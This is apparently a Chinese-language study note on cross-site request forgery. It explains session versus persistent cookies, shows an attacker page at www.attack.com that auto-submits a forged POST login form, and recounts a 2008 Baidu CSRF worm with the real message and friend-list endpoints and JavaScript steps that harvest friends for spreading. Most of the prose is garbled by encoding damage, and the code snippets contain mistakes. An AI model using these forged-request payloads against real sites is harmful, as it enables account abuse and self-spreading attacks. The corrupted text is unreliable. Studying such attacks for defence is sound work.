#CSRF

Cross Site Request Forgery


##Classic CSRF attack

![Classic CSRF attack](img/csrf attack.png)

##�������Cookie����

������ͨ��ʵʩCSRF����֮�����ܹ��ɹ�������Ϊ������ͨ���û���������ɹ�������Cookie��Ե�ʡ�
����������е�Cookie��Ϊ���֣���ʱCookie��Session Cookie���ͱ���Cookie��Third-party Cookie����
Third-party Cookie���Ա��ֵ�¼��Ϣ���û��´���������ĻỰ���´η���ͬһ��վʱ���û��ᷢ�ֲ��������û�����������Ѿ���¼�ˡ���Session Cookie���û��˳��Ự��ʱ
��ͱ�ɾ���ˡ�
Third-party Cookie������ʱ�ͻᱻָ��һ��Expireֵ�������Cookie���������ڣ�����
��������Cookie��Ч����������Cookie�ͻᱻ�����
�������վ�Ĺ����У�����һ����վ������Session Cookie����ô����������̵����������ڣ���ʹ������´���Tabҳ��Session CookieҲ������Ч�ģ�����������αװ�����������û������������������ε���վ��������һ���ˡ�


##POST�����޷�����CSRF


һЩ����ΪCSRF����ֻ����GET������ֻҪ����Ҫ�Ĳ����ĳ�ֻ����POST���󣬾��ܷ�ֹCSRF���������Ƕ��ںܶ���վ��Ӧ����˵��һЩ��Ҫ������δ�ϸ�����GET��
POST�������߿���ʹ��GET����������ύ��ַ��
�磺
     <form action=��/login�� id=��login�� method=��post��>
     <input type=text name=��username�� value=����/>
     <input type=password name=��password�� value=����/>
     <input type=submit name=��submit�� value=��submit��/>
     </form>
�û����Գ��Թ���һ��GET����
http://localhost/login?username=a&password=a

������������Ѿ�������GET��POST�����������߿��Թ���һ��POST����
��򵥵ķ�������һ��ҳ���й���һ��form����Ȼ��ʹ��JavaScript�Զ��ύ�������
��������www.attack.com/attack.html �б�д���´��룺
     <form action=��http://www.target,com/login�� id=��login�� method=��post��>
     <input type=text name=��username�� value=����/>
     <input type=password name=��password�� value=����/>
     <input type=submit name=��submit�� value=��submit��/>
     </form>
     <script>
     var a = document.getElementById(��login��);
     a.inputs[0].value = ��a��;
     a.inputs[1].value = ��a��;
     f.submit();
     </script>

##CSRF Worm

2008��9�£����ڵİ�ȫ��֯80sec������һ���ٶȵ�CSRF worm
©�������ڰٶ��û����ĵķ��Ͷ���Ϣ�����У�
http://msg.baidu.com/?ct=22&cm=MailSend&tn=bmSubmit&sn=�û��˻�&co=��Ϣ����
ֻ��Ҫ�޸Ĳ���sn�����ɶ�ָ�����û����Ͷ���Ϣ�����ٶȵ�����һ���ӿ����ܲ�ѯ��ĳ���û������к��ѣ�
http://frd.baidu.com/?ct=28&un=�û��˻�&cm=FriList&tn=bmABCFriList&callback=gotfriends
�����߽��������������ϳ�һ��CSRF worm--��һ���ٶ��û��鿴����ҳ��󣬽������ĺ��ѷ���һ������Ϣ��Ȼ����������Ϣ���ְ���һ��ͼƬ�����ַ�ٴ�ָ��CSRFҳ�棬ʹ����Щ�����ٴ�ִ����һ��������
Step 1��
     var lsURL=window.location.href;
     loU = lsURL.split(��?��);
     if(loU.length>1)
     {
      var loallPm = loU[1].split(��&��);
     ....

�������ҳ���������ַ��ȡ�ã���&���ź���ַ�������URL����ȡ��Ⱦ�����û����͸�Ⱦ�ߺ��ѵ��û�����

Step 2:
     var gotfriends = function (x)
     {
      for(i=0;i<x[2].length;i++)
        {
          friends.push(x[2][i][1]);
        }
     }
     loadtom(��<script scr=��http://frd.baidu.com/?ct=28&un=��+lusername+��&cm=FriList&tn=bmABCFriList&callback=gotfriends&.tmp=&1=2��></script>��);
ͨ��CSRF©����Զ�̼����ܺ��ߵĺ���tom���ݣ����ݸýӿڵ�tom���ݸ�ʽ����ȡ��������Ϊ���Ĵ���������׼����

Step 3����Ⱦ��Ϣ�������Ϣ���͵ĺ��Ĳ��֡�

������ܺõ�չʾ��CSRF���ƻ���--��ʹû��XSS©������������CSRF��Ҳ�ܹ�������ģ��湥����